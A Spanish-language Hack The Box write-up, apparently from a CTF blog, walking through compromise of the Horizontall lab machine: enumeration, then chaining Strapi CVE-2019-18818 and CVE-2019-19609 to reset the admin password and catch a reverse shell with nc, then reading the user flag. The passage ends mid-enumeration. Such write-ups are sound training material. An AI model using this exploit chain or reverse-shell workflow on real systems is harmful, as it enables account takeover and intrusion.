<!doctype html><html lang=es>
<head>
<title>Horizontall | 7Rocky</title>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<meta name=viewport content="width=device-width,minimum-scale=1">
<meta name=description content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web que esconde un subdominio válido con una aplicación web de Strapi vulnerable a RCE. Existe también una aplicación web interna hecha con Laravel vulnerable a RCE. Para comprometer esta máquina es necesario conocimiento sobre JavaScript, PHP y Python, además de conocer técnicas de reenvío de puertos. En esta máquina se utiliza un script en Python personalizado que encadena dos exploits para Strapi necesarios para ganar RCE">
<meta name=robots content="index, follow">
<meta name=image content="https://7rocky.github.io/images/HTB/Horizontall/Horizontall.png">
<meta name=author content="7Rocky">
<meta property="og:title" content="Horizontall">
<meta property="og:description" content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web que esconde un subdominio válido con una aplicación web de Strapi vulnerable a RCE. Existe también una aplicación web interna hecha con Laravel vulnerable a RCE. Para comprometer esta máquina es necesario conocimiento sobre JavaScript, PHP y Python, además de conocer técnicas de reenvío de puertos. En esta máquina se utiliza un script en Python personalizado que encadena dos exploits para Strapi necesarios para ganar RCE">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7rocky.github.io/htb/horizontall/"><meta property="article:section" content="htb">
<meta property="article:published_time" content="2022-02-05T00:00:00+01:00">
<meta property="article:modified_time" content="2022-02-14T13:16:03+01:00"><meta property="og:site_name" content="7Rocky">
<meta property="og:image" content="https://7rocky.github.io/images/HTB/Horizontall/Horizontall.png">
<meta property="og:author" content="7Rocky">
<meta itemprop=name content="Horizontall">
<meta itemprop=description content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web que esconde un subdominio válido con una aplicación web de Strapi vulnerable a RCE. Existe también una aplicación web interna hecha con Laravel vulnerable a RCE. Para comprometer esta máquina es necesario conocimiento sobre JavaScript, PHP y Python, además de conocer técnicas de reenvío de puertos. En esta máquina se utiliza un script en Python personalizado que encadena dos exploits para Strapi necesarios para ganar RCE"><meta itemprop=datePublished content="2022-02-05T00:00:00+01:00">
<meta itemprop=dateModified content="2022-02-14T13:16:03+01:00">
<meta itemprop=wordCount content="2123">
<meta itemprop=keywords content="cve,strapi,vue,laravel,port-forwarding,rce,">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Horizontall">
<meta name=twitter:description content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web que esconde un subdominio válido con una aplicación web de Strapi vulnerable a RCE. Existe también una aplicación web interna hecha con Laravel vulnerable a RCE. Para comprometer esta máquina es necesario conocimiento sobre JavaScript, PHP y Python, además de conocer técnicas de reenvío de puertos. En esta máquina se utiliza un script en Python personalizado que encadena dos exploits para Strapi necesarios para ganar RCE">
<meta name=twitter:image content="https://7rocky.github.io/images/HTB/Horizontall/Horizontall.png">
<meta name=twitter:author content="7Rocky">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-Z1HQGH3M4D',{anonymize_ip:!1})}</script>
<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
<link href=/css/style.css rel=stylesheet>
<link href=/css/monokai-sublime.min.css rel=stylesheet>
<link href=/css/code.css rel=stylesheet>
<link href=/css/main.css rel=stylesheet>
<script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
<script src=/js/main.js></script>
<div style=display:none>
$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$
</div>
</head>
<body class="ma0 production">
<header>
<div class=bg-black>
<nav class="pv3 ph3 ph4-ns" role=navigation>
<div class="flex-l justify-between items-center center">
<a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a>
<div class="flex-l items-center">
<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/en/htb/horizontall/ title=en>
<img alt=en height=32px src=/images/en.png width=32px>
</a>
<ul class="pl0 ml3 mr3">
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a>
</li>
</ul>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div>
</div>
</nav>
</div>
</header>
<main class=pb7 role=main>
<article class="flex-l flex-wrap justify-between mw8 center ph3">
<header class="mt4 w-100">
<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside>
<div id=sharing class=mt3>
<a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/horizontall/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a>
<a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/horizontall/&text=Horizontall" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
<a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/horizontall/&title=Horizontall" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
</div>
<h1 class="f1 mt3 mb1">Horizontall</h1>
<time class="f6 mv4 dib tracked" datetime=2022-02-05T00:00:00+01:00>05 / 02 / 2022</time>
</header>
<div class=htb-image>
<img alt=Horizontall src=/images/HTB/Horizontall/Horizontall.png>
</div>
<ul class="nested-links tags">
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/cve title=CVE>CVE</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/strapi title=Strapi>Strapi</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/vue title=Vue.js>Vue.js</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/laravel title=Laravel>Laravel</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/port-forwarding title="Reenvío de puertos">Reenvío de puertos</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/rce title="Ejecución remota de comandos">Ejecución remota de comandos</a>
</li>
</ul>
<aside aria-label=aside class="w-20-l mt6-l aside-mobile">
<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
<p class="f5 b mb3">Contenidos de este write-up</p>
<nav id=TableOfContents>
<ul>
<li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li>
<li><a href=#enumeración-web>Enumeración web</a></li>
<li><a href=#explotando-strapi>Explotando Strapi</a></li>
<li><a href=#enumeración-del-sistema>Enumeración del sistema</a></li>
<li><a href=#explotando-laravel>Explotando Laravel</a></li>
<li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li>
</ul>
</nav>
</div>
</aside>
<div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul>
<li>
<strong>SO</strong>: Linux
</li>
<li>
<strong>Dificultad</strong>: Fácil
</li>
<li>
<strong>Dirección IP</strong>: 10.10.11.105
</li>
<li>
<strong>Fecha</strong>: 28 / 08 / 2021
</li>
</ul>
<h2 id=escaneo-de-puertos>Escaneo de puertos</h2>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.105 -p 22,80
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up (0.041s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: horizontall
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done -- 1 IP address (1 host up) scanned in 10.27 seconds
</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).</p>
<h2 id=enumeración-web>Enumeración web</h2>
<p>La página web está redirigiendo a <code>http://horizontall.htb</code>, por lo que es necesario añadir el dominio al archivo <code>/etc/hosts</code>. Después, podremos ver una aplicación web hecha en Vue.js (un <em>framework</em> de JavaScript para <em>front-end</em>):</p>
<p><img src=/images/HTB/Horizontall/Horizontall-vue.png alt="Horizontall landing page"></p>
<p>Sin embargo, lo único interesante aquí es un archivo de JavaScript que contiene una URL para <code>http://api-prod.horizontall.htb</code> (podemos encontrarla buscando por <code>"horizontall.htb"</code>):</p>
<p><img src=/images/HTB/Horizontall/Horizontall-source.png alt="Horizontall HTML source code"></p>
<p><img src=/images/HTB/Horizontall/Horizontall-subdomain.png alt="Horizontall JavaScript subdomain"></p>
<p>Y de nuevo, añadimos el subdominio a <code>/etc/hosts</code>. En este subdominio vemos una simple aplicación web como la siguiente:</p>
<p><img src=/images/HTB/Horizontall/Horizontall-strapi.png alt="Horizontall API Welcome"></p>
<p>Ejecutando <code>gobuster</code> podemos enumerar algunas rutas:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gobuster</span> dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -q -r -u http://api-prod.horizontall.htb  
/reviews              (Status: 200) [Size: 507]
/users                (Status: 403) [Size: 60]
/admin                (Status: 200) [Size: 854]
</code></pre></div>
<p>Las primeras dos rutas devuelven un resultado en JSON:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -s http://api-prod.horizontall.htb/users | <span class=code-dark-green>jq</span>  
{
  <span class=code-blue>"statusCode"</span>: 403,
  <span class=code-blue>"error"</span>: <span class=code-dark-green>"Forbidden"</span>,
  <span class=code-blue>"message"</span>: <span class=code-dark-green>"Forbidden"</span>
}
</code></pre></div>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -s http://api-prod.horizontall.htb/reviews | <span class=code-dark-green>jq</span>
[
  {
    <span class=code-blue>"id"</span>: 1,
    <span class=code-blue>"name"</span>: <span class=code-dark-green>"wail"</span>,
    <span class=code-blue>"description"</span>: <span class=code-dark-green>"This is good service"</span>,
    <span class=code-blue>"stars"</span>: 4,
    <span class=code-blue>"created_at"</span>: <span class=code-dark-green>"2021-05-29T13:23:38.000Z"</span>,
    <span class=code-blue>"updated_at"</span>: <span class=code-dark-green>"2021-05-29T13:23:38.000Z"</span>
  },
  {
    <span class=code-blue>"id"</span>: 2,
    <span class=code-blue>"name"</span>: <span class=code-dark-green>"doe"</span>,
    <span class=code-blue>"description"</span>: <span class=code-dark-green>"i'm satisfied with the product"</span>,
    <span class=code-blue>"stars"</span>: 5,
    <span class=code-blue>"created_at"</span>: <span class=code-dark-green>"2021-05-29T13:24:17.000Z"</span>,
    <span class=code-blue>"updated_at"</span>: <span class=code-dark-green>"2021-05-29T13:24:17.000Z"</span>
  },
  {
    <span class=code-blue>"id"</span>: 3,
    <span class=code-blue>"name"</span>: <span class=code-dark-green>"john"</span>,
    <span class=code-blue>"description"</span>: <span class=code-dark-green>"create service with minimum price i hop i can buy more in the futur"</span>,  
    <span class=code-blue>"stars"</span>: 5,
    <span class=code-blue>"created_at"</span>: <span class=code-dark-green>"2021-05-29T13:25:26.000Z"</span>,
    <span class=code-blue>"updated_at"</span>: <span class=code-dark-green>"2021-05-29T13:25:26.000Z"</span>
  }
]
</code></pre></div>
<p>Y la ruta <code>/admin</code> redirige a <code>/admin/auth/login</code> y muestra un formulario de inicio de sesión de Strapi. Sin embargo, no podemos hacer nada aquí. Podemos probar credenciales por defecto, pero no funcionan.</p>
<p><img src=/images/HTB/Horizontall/Horizontall-strapi-login.png alt="Horizontall Strapi login"></p>
<p>Podemos comprobar todas las peticiones que se realizan al acceder a <code>/admin</code> desde las herramientas de desarrollador del navegador. Hay una que apunta a <code>/admin/init</code> que responde con cierta información que incluye la versión de Strapi:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -s http://api-prod.horizontall.htb/admin/init | <span class=code-dark-green>jq</span>  
{
  <span class=code-blue>"data"</span>: {
    <span class=code-blue>"uuid"</span>: <span class=code-dark-green>"a55da3bd-9693-4a08-9279-f9df57fd1817"</span>,
    <span class=code-blue>"currentEnvironment"</span>: <span class=code-dark-green>"development"</span>,
    <span class=code-blue>"autoReload"</span>: false,
    <span class=code-blue>"strapiVersion"</span>: <span class=code-dark-green>"3.0.0-beta.17.4"</span>
  }
}
</code></pre></div>
<p>Con esta información, podemos buscar <em>exploits</em> y vulnerabilidades para esta versión de Strapi. Existen dos que aplican en este caso. El primero permite cambiar la contraseña de <code>admin</code> sin autenticación (CVE-2019-18818), y el otro consigue ejecución remota de comandos (RCE), pero necesita autenticación como administrador (CVE-2019-19609).</p>
<h2 id=explotando-strapi>Explotando Strapi</h2>
<p>En <a href=https://thatsn0tmysite.wordpress.com/2019/11/15/x05/>este blog</a> se explica la vulnerabilidad del reinicio de contraseña. Existe un código en Python que lo automatiza. El <em>script</em> devuelve el JSON Web Token (JWT) del usuario que se ha autenticado. Y de hecho, este <em>token</em> JWT es necesario para ejecutar el segundo <em>exploit</em>, que puede encontrarse <a href=https://bittherapy.net/post/strapi-framework-remote-code-execution/>aquí</a>.</p>
<p>Para obtener RCE en Strapi, junté ambos <em>exploits</em> en un <em>script</em> de Python llamado <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Horizontall/rce_strapi.py><code>rce_strapi.py</code></a> (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Horizontall#rce_strapipy>aquí</a>).</p>
<p>Se necesita la dirección de correo de <code>admin</code>, pero podemos deducir que es <code>admin@horizontall.htb</code>.</p>
<p>Si ejecutamos el <em>script</em>, la contraseña se cambiará a la indicada (<code>asdfasdfasdf</code>). Y obtenemos acceso a la máquina desde <code>nc</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> rce_strapi.py 10.10.17.44 4444
[*] Detected version(GET /admin/strapiVersion): 3.0.0-beta.17.4
[*] Sending password reset request...
[*] Setting new password...
[*] Response: {"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMTg5ODcyLCJleHAiOjE2MzI3ODE4NzJ9.4_HRMhnzA9CEcw6-p2uCOKJWTxpRkCiMaWiNfGDWKRc","user":{"id":3,"username":"admin","email":"admin@horizontall.htb","blocked":null}}  
</code></pre></div>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.105.
Ncat: Connection from 10.10.11.105:40764.
/bin/sh: 0: can't access tty; job control turned off  
$ script /dev/null -c bash
Script started, file is /dev/null
strapi@horizontall:~/myapi$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class=code-cyan>$</span> <span class=code-dark-green>stty</span> raw -echo; <span class=code-dark-green>fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
strapi@horizontall:~/myapi$ export TERM=xterm
strapi@horizontall:~/myapi$ export SHELL=bash
strapi@horizontall:~/myapi$ stty rows 50 columns 158
</code></pre></div>
<h2 id=enumeración-del-sistema>Enumeración del sistema</h2>
<p>Desde la máquina, podemos ver que existe un usuario llamado <code>developer</code>. No obstante, podemos listar su directorio personal y leer la <em>flag</em> <code>user.txt</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>strapi@horizontall:~/myapi$ ls /home
<span class=code-blue>developer</span>
strapi@horizontall:~/myapi$ ls -la /home/developer/
total 108
drwxr-xr-x  8 developer developer  4096 Aug  2 12:07 .
drwxr-xr-x  3 root      root       4096 May 25 11:43 ..
lrwxrwxrwx  1 root      root          9 Aug  2 12:05 <span class=code-cyan>.bash_history</span> -> /dev/null  
-rw-r-----  1 developer developer   242 Jun  1 12:53 .bash_logout
-rw-r-----  1 developer developer  3810 Jun  1 12:47 .bashrc
drwx------  3 developer developer  4096 May 26 12:00 <span class=code-blue>.cache</span>
-rw-rw----  1 developer developer 58460 May 26 11:59 composer-setup.php
drwx------  5 developer developer  4096 Jun  1 11:54 <span class=code-blue>.config</span>
drwx------  3 developer developer  4096 May 25 11:45 <span class=code-blue>.gnupg</span>
drwxrwx---  3 developer developer  4096 May 25 19:44 <span class=code-blue>.local</span>
drwx------ 12 developer developer  4096 May 26 12:21 <span class=code-blue>myproject</span>
-rw-r-----  1 developer developer   807 Apr  4  2018 .profile
drwxrwx---  2 developer developer  4096 Jun  4 11:21 <span class=code-blue>.ssh</span>
-r--r--r--  1 developer developer    33 Aug 28 21:38 user.txt
lrwxrwxrwx  1 root      root          9 Aug  2 12:07 <span class=code-cyan>.viminfo</span> -> /dev/null
strapi@horizontall:~/myapi$ cat /home/developer/user.txt
8737d52fd79f838b0e4dc682bc8a28d9
</code></pre></div>
<p>Existe un archivo interesante llamado <code>composer-setup.php</code> y un directorio llamado <code>myproject</code>, pero no tenemos permisos para leerlos.</p>
<p>Podemos buscar credenciales en el código fuente de la aplicación web de Strapi. De hecho, podemos encontrar credenciales para MySQL de la siguiente manera:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>strapi@horizontall:~/myapi$ ls -la
total 648
drwxr-xr-x    9 strapi strapi   4096 Jul 29  2021 <span class=code-blue>.</span>
drwxr-xr-x   10 strapi strapi   4096 Feb  3 15:07 <span class=code-blue>..</span>
drwxr-xr-x    3 strapi strapi   4096 May 29  2021 <span class=code-blue>api</span>
drwxrwxr-x    2 strapi strapi  12288 May 26  2021 <span class=code-blue>build</span>
drwxrwxr-x    5 strapi strapi   4096 May 26  2021 <span class=code-blue>.</span>cache
drwxr-xr-x    5 strapi strapi   4096 Jul 29  2021 <span class=code-blue>config</span>
-rw-r--r--    1 strapi strapi    249 May 26  2021 .editorconfig
-rw-r--r--    1 strapi strapi     32 May 26  2021 .eslintignore
-rw-r--r--    1 strapi strapi    541 May 26  2021 .eslintrc
drwxr-xr-x    3 strapi strapi   4096 May 26  2021 <span class=code-blue>extensions</span>
-rw-r--r--    1 strapi strapi   1150 May 26  2021 favicon.ico
-rw-r--r--    1 strapi strapi   1119 May 26  2021 .gitignore
drwxrwxr-x 1099 strapi strapi  36864 Aug  3  2021 <span class=code-blue>node_modules</span>
-rw-rw-r--    1 strapi strapi   1009 May 26  2021 package.json
-rw-rw-r--    1 strapi strapi 552845 May 26  2021 package-lock.json
drwxr-xr-x    3 strapi strapi   4096 Jun  2  2021 <span class=code-blue>public</span>
-rw-r--r--    1 strapi strapi     69 May 26  2021 README.md
strapi@horizontall:~/myapi$ ls -la config/
total 40
drwxr-xr-x 5 strapi strapi 4096 Jul 29 04:24 <span class=code-blue>.</span>
drwxr-xr-x 9 strapi strapi 4096 Jul 29 04:29 <span class=code-blue>..</span>
-rw-r--r-- 1 strapi strapi  136 May 26 14:31 application.json
-rw-r--r-- 1 strapi strapi  110 May 26 14:31 custom.json
drwxr-xr-x 5 strapi strapi 4096 May 26 14:31 <span class=code-blue>environments</span>
drwxr-xr-x 3 strapi strapi 4096 May 26 14:31 <span class=code-blue>functions</span>
-rw-r--r-- 1 strapi strapi  188 May 26 14:31 hook.json
-rw-r--r-- 1 strapi strapi  173 May 26 14:31 language.json
drwxr-xr-x 2 strapi strapi 4096 May 26 14:31 <span class=code-blue>locales</span>
-rw-r--r-- 1 strapi strapi  317 May 26 14:31 middleware.json
strapi@horizontall:~/myapi$ ls -la config/environments/
total 20
drwxr-xr-x 5 strapi strapi 4096 May 26 14:31 <span class=code-blue>.</span>
drwxr-xr-x 5 strapi strapi 4096 Jul 29 04:24 <span class=code-blue>..</span>
drwxr-xr-x 2 strapi strapi 4096 Jul 29 04:38 <span class=code-blue>development</span>
drwxr-xr-x 2 strapi strapi 4096 Jul 29 04:24 <span class=code-blue>production</span>
drwxr-xr-x 2 strapi strapi 4096 May 26 14:31 <span class=code-blue>staging</span>
